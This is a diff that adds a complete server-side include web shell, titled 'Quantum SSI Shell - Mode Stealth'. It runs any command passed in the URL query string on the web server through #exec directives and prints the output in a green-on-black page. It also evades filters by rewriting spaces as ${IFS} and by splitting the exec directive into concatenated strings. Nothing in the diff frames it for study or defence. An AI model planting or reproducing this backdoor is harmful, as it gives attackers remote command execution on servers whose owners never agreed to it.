@@ -1,0 +1,45 @@
+
+<!--#config timefmt="%A %B %d, %Y %H:%M:%S" errmsg="[ SSI BLOCKED ]" -->
+<!--#set var="in" value="$QUERY_STRING_UNESCAPED" -->
+<!--#if expr="!$in" -->
+<!--#set var="cmd" value="whoami" -->
+<!--#else -->
+<!--#set var="cmd" value="$in" -->
+<!--#endif -->
+
+<html>
+<head>
+<title>Quantum SSI Shell</title>
+<meta charset="UTF-8">
+<style>
+body { background: #111; color: #0f0; font-family: monospace; }
+input, button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+textarea { background: #000; color: #0f0; border: 1px solid #0f0; width: 100%; height: 300px; }
+</style>
+<script>
+function send() {
+  let cmd = document.getElementById("cmd").value;
+  let encoded = encodeURIComponent(cmd.replace(/ /g, '${IFS}'));
+  location.href = "<!--#ech" + "o var=DOCUMENT_NAME -->?" + encoded;
+}
+document.addEventListener('keydown', e => {
+  if (e.key === "Enter") send();
+});
+</script>
+</head>
+<body>
+<h3>Quantum SSI Shell - Mode Stealth</h3>
+<b>Server:</b> <span style="color:#0f0;"><!--#exec cmd="uname -n" --></span><br>
+<b>Date:</b> <!--#echo var="DATE_LOCAL" --><br>
+<hr>
+Command: <input type="text" id="cmd" placeholder="ls -la" size="60">
+<button onclick="send()">Execute</button>
+<hr>
+<b>Output:</b>
+<textarea readonly>
+<!--#ex" + "ec cmd="$cmd" -->
+</textarea>
+<hr>
+<small>QuantumFusion Shell v1 - Ultra Stealth SSI Engine</small>
+</body>
+</html>
